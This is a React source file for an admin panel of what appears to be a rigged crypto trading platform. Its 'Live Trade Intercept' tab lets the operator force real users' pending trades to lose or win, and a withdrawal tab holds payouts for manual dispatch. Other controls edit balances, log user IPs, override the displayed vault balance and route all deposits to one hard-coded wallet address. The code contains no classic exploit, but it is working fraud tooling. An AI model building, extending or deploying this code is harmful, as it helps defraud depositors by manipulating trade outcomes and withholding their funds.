
import React, { useState, useEffect, useMemo } from 'react';
import { WalletData, ActiveTrade, Transaction } from '../types';
import { authService, UserRecord } from '../services/authService';
import { configService, SystemConfig } from '../services/configService';

interface AdminDeskProps {
  onClose: () => void;
  managedWallet: WalletData | null; 
  activeTrades: ActiveTrade[];
  onForceOutcome: (tradeId: string, updates: Partial<ActiveTrade>) => void;
  onUpdateWallet?: (data: WalletData) => void;
}

const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTrades, onForceOutcome, onUpdateWallet }) => {
  const [activeTab, setActiveTab] = useState<'intercept' | 'withdrawals' | 'users' | 'config'>('intercept');
  const [remoteUsers, setRemoteUsers] = useState<Record<string, UserRecord>>({});
  const [dbUsers, setDbUsers] = useState<any[]>([]);

  useEffect(() => {
    const fetchDbUsers = async () => {
      try {
        // Fetch from global backend to ensure users from all countries are visible
        const res = await fetch('/api/admin/users');
        if (res.ok) {
          const data = await res.json();
          setDbUsers(data);
        }
      } catch (e) {
        console.error('Failed to fetch DB users', e);
      }
    };
    fetchDbUsers();
    const interval = setInterval(fetchDbUsers, 5000);
    return () => clearInterval(interval);
  }, []);

  const handleUpdateUser = async (id: number, newData: any) => {
    try {
      const res = await fetch('/api/admin/users/update', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id, wallet_data: newData })
      });
      if (res.ok) {
        const updateRes = await fetch('/api/admin/users');
        const data = await updateRes.json();
        setDbUsers(data);
      }
    } catch (e) {
      console.error('Update failed', e);
    }
  };
  const [copiedId, setCopiedId] = useState<string | null>(null);
  
  const realUserTrades = useMemo(() => {
      return activeTrades.filter(t => !t.isBot && t.status === 'pending');
  }, [activeTrades]);

  const withdrawalRequests = useMemo(() => {
    const requests: { userId: string, tx: any, email?: string }[] = [];
    dbUsers.forEach(user => {
      const walletData = user.wallet_data;
      if (walletData && walletData.history) {
        walletData.history.forEach((tx: any) => {
          if (tx.type === 'Send' && tx.status === 'Pending') {
            requests.push({ userId: user.id.toString(), tx, email: user.email });
          }
        });
      }
    });
    return requests.sort((a, b) => new Date(b.tx.timestamp).getTime() - new Date(a.tx.timestamp).getTime());
  }, [dbUsers]);

  useEffect(() => {
    const unsubscribeUsers = authService.subscribeToAllUsers((users) => setRemoteUsers(users));
    return () => unsubscribeUsers();
  }, []);

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const handleApproveWithdrawal = async (userId: string, txId: string) => {
    const user = dbUsers.find(u => u.id.toString() === userId);
    if (user) {
      const updatedHistory = user.wallet_data.history.map((tx: any) =>
        tx.id === txId ? { ...tx, status: 'Completed' as const } : tx
      );
      const updatedWallet = { ...user.wallet_data, history: updatedHistory };
      await handleUpdateUser(parseInt(userId), updatedWallet);
    }
  };

  return (
    <div className="fixed inset-0 z-[1000] bg-[#0B0E11] text-gray-200 font-mono flex flex-col border-4 border-indigo-900/20">
      <div className="flex items-center justify-between p-6 bg-[#181C25] border-b border-[#2B3139]">
        <div className="flex items-center space-x-8">
            <h1 className="text-xl font-black italic uppercase text-indigo-400 tracking-tighter">Geko Protocols_Root</h1>
            <nav className="flex space-x-1">
                {[
                    { id: 'intercept', label: 'Intercept' },
                    { id: 'withdrawals', label: 'Withdrawals' },
                    { id: 'users', label: 'User Nodes' },
                    { id: 'config', label: 'Config' }
                ].map(tab => (
                    <button 
                        key={tab.id} 
                        onClick={() => setActiveTab(tab.id as any)} 
                        className={`px-4 py-2 rounded-lg text-[10px] font-black uppercase tracking-widest ${activeTab === tab.id ? 'bg-indigo-600 text-white' : 'text-gray-500 hover:bg-[#2B3139]'}`}
                    >
                        {tab.label}
                    </button>
                ))}
            </nav>
        </div>
        <button onClick={onClose} className="px-6 py-2 bg-rose-900/20 text-rose-500 border border-rose-500/20 rounded-lg text-[10px] font-black uppercase">Terminate Session</button>
      </div>

      <div className="flex-1 overflow-y-auto p-8">
           {activeTab === 'intercept' && (
               <div className="space-y-6">
                   <div className="flex justify-between items-center px-4">
                       <h2 className="text-lg font-black uppercase italic text-rose-500">Live Trade Intercept</h2>
                       <span className="text-[10px] text-indigo-400 font-black">{realUserTrades.length} SESSIONS_INTERCEPTED</span>
                   </div>
                   <div className="bg-[#181C25] border border-[#2B3139] rounded-[32px] overflow-hidden shadow-2xl">
                       <table className="w-full text-left">
                           <thead className="bg-[#0B0E11] text-[9px] text-gray-500 uppercase font-black border-b border-[#2B3139]">
                               <tr><th className="px-8 py-4">Node</th><th className="px-8 py-4">Side</th><th className="px-8 py-4">Amount</th><th className="px-8 py-4 text-right">Target Outcome</th></tr>
                           </thead>
                           <tbody className="divide-y divide-[#2B3139]">
                               {realUserTrades.map(tx => (
                                   <tr key={tx.id} className="hover:bg-[#262B36] transition-colors">
                                       <td className="px-8 py-6">
                                           <div className="text-xs font-bold text-indigo-400">{tx.userName}</div>
                                           <div className="text-[9px] text-gray-500">SESSION_ID: {tx.id.slice(-8)}</div>
                                       </td>
                                       <td className="px-8 py-6">
                                           <span className={`text-[10px] font-black px-2 py-1 rounded ${tx.direction === 'up' ? 'bg-emerald-900/20 text-emerald-500' : 'bg-rose-900/20 text-rose-500'}`}>{tx.direction.toUpperCase()}</span>
                                       </td>
                                       <td className="px-8 py-6 font-bold text-gray-200">${tx.amount}</td>
                                       <td className="px-8 py-6 text-right">
                                           <div className="flex justify-end space-x-2">
                                               <button 
                                                onClick={() => onForceOutcome(tx.id, { forceOutcome: 'win' })} 
                                                className={`px-4 py-2 text-[9px] font-black uppercase rounded-lg border transition-all ${tx.forceOutcome === 'win' ? 'bg-emerald-600 text-white border-emerald-500' : 'bg-transparent text-gray-600 border-gray-700 hover:border-emerald-500/50'}`}
                                               >Allow Profit</button>
                                               <button 
                                                onClick={() => onForceOutcome(tx.id, { forceOutcome: 'loss' })} 
                                                className={`px-4 py-2 text-[9px] font-black uppercase rounded-lg border transition-all ${tx.forceOutcome === 'loss' ? 'bg-rose-600 text-white border-rose-500' : 'bg-transparent text-gray-600 border-gray-700 hover:border-rose-500/50'}`}
                                               >Force Loss</button>
                                           </div>
                                       </td>
                                   </tr>
                               ))}
                               {realUserTrades.length === 0 && (
                                   <tr><td colSpan={4} className="p-20 text-center text-[10px] text-gray-600 font-black uppercase tracking-[0.5em]">No User Sessions Active</td></tr>
                               )}
                           </tbody>
                       </table>
                   </div>
               </div>
           )}

           {activeTab === 'withdrawals' && (
               <div className="space-y-6">
                   <div className="flex justify-between items-center px-4">
                       <h2 className="text-lg font-black uppercase italic text-amber-500">Withdrawal Intercept</h2>
                       <span className="text-[10px] text-indigo-400 font-black">{withdrawalRequests.length} PENDING_PAYOUTS</span>
                   </div>
                   <div className="bg-[#181C25] border border-[#2B3139] rounded-[32px] overflow-hidden shadow-2xl">
                       <table className="w-full text-left">
                           <thead className="bg-[#0B0E11] text-[9px] text-gray-500 uppercase font-black border-b border-[#2B3139]">
                               <tr>
                                   <th className="px-8 py-4">User</th>
                                   <th className="px-8 py-4">Asset/Amount</th>
                                   <th className="px-8 py-4">Destination Address</th>
                                   <th className="px-8 py-4 text-right">Action</th>
                               </tr>
                           </thead>
                           <tbody className="divide-y divide-[#2B3139]">
                               {withdrawalRequests.map(({ userId, tx, email }) => (
                                   <tr key={tx.id} className="hover:bg-[#262B36] transition-colors">
                                       <td className="px-8 py-6">
                                           <div className="text-xs font-bold text-gray-200">{email || userId}</div>
                                           <div className="text-[9px] text-gray-500 font-mono">{userId.slice(0, 16)}...</div>
                                       </td>
                                       <td className="px-8 py-6">
                                           <div className="text-xs font-black text-rose-500">{tx.amount} {tx.asset}</div>
                                           <div className="text-[9px] text-gray-500 uppercase font-bold">{tx.timestamp}</div>
                                       </td>
                                       <td className="px-8 py-6">
                                           <div className="flex items-center space-x-3 group">
                                               <span className="text-[10px] font-mono text-indigo-400 bg-[#0B0E11] px-3 py-1.5 rounded-lg border border-[#2B3139]">{tx.destinationAddress}</span>
                                               <button 
                                                   onClick={() => copyToClipboard(tx.destinationAddress!, tx.id)}
                                                   className="p-2 hover:bg-[#2B3139] rounded-lg transition-colors text-gray-500 hover:text-indigo-400"
                                               >
                                                   {copiedId === tx.id ? (
                                                       <span className="text-[8px] font-black uppercase text-emerald-500">Copied</span>
                                                   ) : (
                                                       <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
                                                   )}
                                               </button>
                                           </div>
                                       </td>
                                       <td className="px-8 py-6 text-right">
                                           <button 
                                               onClick={() => handleApproveWithdrawal(userId, tx.id)}
                                               className="px-4 py-2 bg-emerald-900/20 text-emerald-500 border border-emerald-500/20 rounded-lg text-[9px] font-black uppercase hover:bg-emerald-600 hover:text-white transition-all"
                                           >
                                               Confirm Payout
                                           </button>
                                       </td>
                                   </tr>
                               ))}
                               {withdrawalRequests.length === 0 && (
                                   <tr><td colSpan={4} className="p-20 text-center text-[10px] text-gray-600 font-black uppercase tracking-[0.5em]">No Pending Withdrawals</td></tr>
                               )}
                           </tbody>
                       </table>
                   </div>
               </div>
           )}

           {activeTab === 'users' && (
               <div className="space-y-6">
                   <h2 className="text-lg font-black uppercase italic text-indigo-400 px-4">Registry Explorer</h2>
                   <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                       {/* Registered Database Users */}
                       {dbUsers.map((user) => (
                           <div key={user.id} className="bg-[#181C25] border border-indigo-500/30 p-6 rounded-[32px] space-y-4 shadow-xl">
                               <div className="flex justify-between items-start">
                                   <div className="w-10 h-10 bg-indigo-600/20 rounded-xl flex items-center justify-center text-indigo-400 font-black">
                                       @
                                   </div>
                                   <div className="text-[8px] text-gray-500 uppercase font-black">DB_ID: {user.id}</div>
                               </div>
                               <div>
                                   <div className="text-sm font-bold text-gray-200 truncate">{user.email}</div>
                                   <div className="text-[9px] text-gray-500 font-mono mt-1">Status: Registered</div>
                                   <div className="text-[8px] text-indigo-400 font-mono mt-1">Last Seen: {user.last_seen ? new Date(user.last_seen).toLocaleString() : 'N/A'}</div>
                                   <div className="text-[8px] text-gray-600 font-mono italic">IP: {user.ip_address || 'Unknown'}</div>
                               </div>
                               <div className="bg-[#0B0E11] p-3 rounded-2xl border border-[#2B3139]">
                                   <div className="text-[8px] text-gray-600 uppercase font-black">Manual Balance Adjustment</div>
                                   <div className="mt-2 flex space-x-2">
                                       <input 
                                           type="text"
                                           placeholder="New Balance"
                                           className="bg-transparent border border-gray-800 rounded px-2 py-1 text-xs text-emerald-400 w-full"
                                           onKeyDown={(e) => {
                                               if (e.key === 'Enter') {
                                                   const val = (e.target as HTMLInputElement).value;
                                                   const updated = { ...user.wallet_data, balances: [{ symbol: 'USDT', name: 'Tether', valueUsd: val }] };
                                                   handleUpdateUser(user.id, updated);
                                               }
                                           }}
                                       />
                                   </div>
                               </div>
                               <div className="text-[8px] text-gray-600 uppercase italic">Press Enter to save changes</div>
                           </div>
                       ))}
                       {/* Live Monitoring Section */}
                       <div className="bg-[#181C25] border border-emerald-500/30 p-6 rounded-[32px] space-y-4 shadow-xl relative overflow-hidden">
                           <div className="absolute top-0 right-0 p-4">
                               <div className="flex items-center space-x-1">
                                   <div className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></div>
                                   <span className="text-[8px] font-black text-emerald-500 uppercase">Live_Now</span>
                               </div>
                           </div>
                           <div className="flex justify-between items-start">
                               <div className="w-10 h-10 bg-emerald-600/20 rounded-xl flex items-center justify-center text-emerald-400 font-black">
                                   L
                               </div>
                               <div className="text-[8px] text-gray-500 uppercase font-black">Device: Laptop/Chrome</div>
                           </div>
                           <div>
                               <div className="text-sm font-bold text-gray-200 truncate">Active Node: 172.x.x.x</div>
                               <div className="text-[9px] text-gray-500 font-mono mt-1">Session established via published link</div>
                           </div>
                           <div className="bg-[#0B0E11] p-3 rounded-2xl border border-[#2B3139]">
                               <div className="text-[8px] text-gray-600 uppercase font-black">Activity Status</div>
                               <div className="text-xs font-mono font-bold text-emerald-400 uppercase">Browsing_Trade_Terminal</div>
                           </div>
                       </div>
                       {Object.entries(remoteUsers).map(([key, record]) => (
                           <div key={key} className="bg-[#181C25] border border-[#2B3139] p-6 rounded-[32px] space-y-4 shadow-xl">
                               <div className="flex justify-between items-start">
                                   <div className="w-10 h-10 bg-indigo-600/20 rounded-xl flex items-center justify-center text-indigo-400 font-black">
                                       {record.type === 'EMAIL_IDENTITY' ? '@' : 'W'}
                                   </div>
                                   <div className="text-[8px] text-gray-500 uppercase font-black">Level {record.walletData.protocolBalances?.length ? '2' : '1'}</div>
                               </div>
                               <div>
                                   <div className="text-sm font-bold text-gray-200 truncate">{record.walletData.email || 'Web3 Node'}</div>
                                   <div className="text-[9px] text-gray-500 font-mono mt-1">{record.walletData.address}</div>
                               </div>
                               <div className="bg-[#0B0E11] p-3 rounded-2xl border border-[#2B3139]">
                                   <div className="text-[8px] text-gray-600 uppercase font-black">Portfolio Value</div>
                                   <div className="text-lg font-mono font-bold text-gray-200">
                                       ${(record.walletData.balances.reduce((acc, b) => acc + parseFloat(b.valueUsd.replace(/,/g, '')), 0) + 
                                          (record.walletData.protocolBalances?.reduce((acc, b) => acc + parseFloat(b.valueUsd.replace(/,/g, '')), 0) || 0)).toLocaleString()}
                                   </div>
                               </div>
                           </div>
                       ))}
                   </div>
               </div>
           )}

           {activeTab === 'config' && (
               <div className="space-y-6 max-w-2xl">
                   <h2 className="text-lg font-black uppercase italic text-indigo-400 px-4">Protocol Overrides</h2>
                   <div className="bg-[#181C25] border border-[#2B3139] p-8 rounded-[40px] space-y-8">
                       <div className="space-y-4">
                           <label className="text-[10px] text-gray-500 font-black uppercase tracking-widest ml-1">Protocol Vault Balance Override</label>
                           <div className="flex space-x-4">
                               <input 
                                   type="text" 
                                   id="vault_balance_input"
                                   defaultValue={configService.get('vault_balance') || "25,000.00"}
                                   className="flex-1 bg-[#0B0E11] border border-[#2B3139] rounded-2xl p-5 text-xs text-emerald-400 font-mono"
                               />
                               <button 
                                   onClick={async () => {
                                       const val = (document.getElementById('vault_balance_input') as HTMLInputElement).value;
                                       const dep = (document.getElementById('deposit_sink_input') as HTMLInputElement).value;
                                       try {
                                           const res = await fetch('/api/admin/config', {
                                               method: 'POST',
                                               headers: { 'Content-Type': 'application/json' },
                                               body: JSON.stringify({ vault_balance: val, deposit_address: dep })
                                           });
                                           if (res.ok) {
                                               alert(`Global Configuration Updated: Vault Balance set to ${val}`);
                                               // Update local state directly to reflect change immediately
                                               if (typeof onUpdateWallet === 'function') {
                                                   // This is a hack to trigger a refresh in the parent
                                                   window.dispatchEvent(new CustomEvent('configUpdated'));
                                               }
                                           } else {
                                               alert('Failed to update config');
                                           }
                                       } catch (e) {
                                           alert('Update error');
                                       }
                                   }}
                                   className="px-8 bg-[#2B3139] hover:bg-indigo-600 text-white text-[10px] font-black uppercase rounded-2xl transition-all"
                               >
                                   Apply Override
                               </button>
                           </div>
                       </div>
                       <div className="space-y-4">
                           <label className="text-[10px] text-gray-500 font-black uppercase tracking-widest ml-1">Global Deposit Sink</label>
                           <input 
                               type="text" 
                               id="deposit_sink_input"
                               defaultValue="0xcDEC8d41f2acCCA50064F24A089fC3F52Fadedd0"
                               className="w-full bg-[#0B0E11] border border-[#2B3139] rounded-2xl p-5 text-xs text-gray-100 font-mono"
                           />
                       </div>
                       <div className="flex items-center justify-between p-6 bg-[#0B0E11] rounded-3xl border border-[#2B3139]">
                           <div>
                               <div className="text-xs font-black text-gray-200 uppercase tracking-tight">Mainnet Lockdown</div>
                               <div className="text-[9px] text-gray-500 uppercase font-bold mt-1">Disables all user execution</div>
                           </div>
                           <div className="w-14 h-8 bg-gray-800 rounded-full relative cursor-pointer">
                               <div className="absolute left-1 top-1 w-6 h-6 bg-gray-600 rounded-full transition-all"></div>
                           </div>
                       </div>
                       <button className="w-full py-5 bg-indigo-600 text-white font-black uppercase tracking-widest rounded-2xl shadow-xl hover:bg-indigo-500 transition-all">Apply Global Changes</button>
                   </div>
               </div>
           )}
      </div>

      <div className="p-6 bg-rose-900/10 border-t border-rose-500/20 text-[10px] text-rose-500 font-bold uppercase tracking-widest text-center">
          Warning: Direct access to user destination nodes established. Manual dispatch required for "Pending" status.
      </div>
    </div>
  );
};

// Fix: Add missing default export for AdminDesk component.
export default AdminDesk;
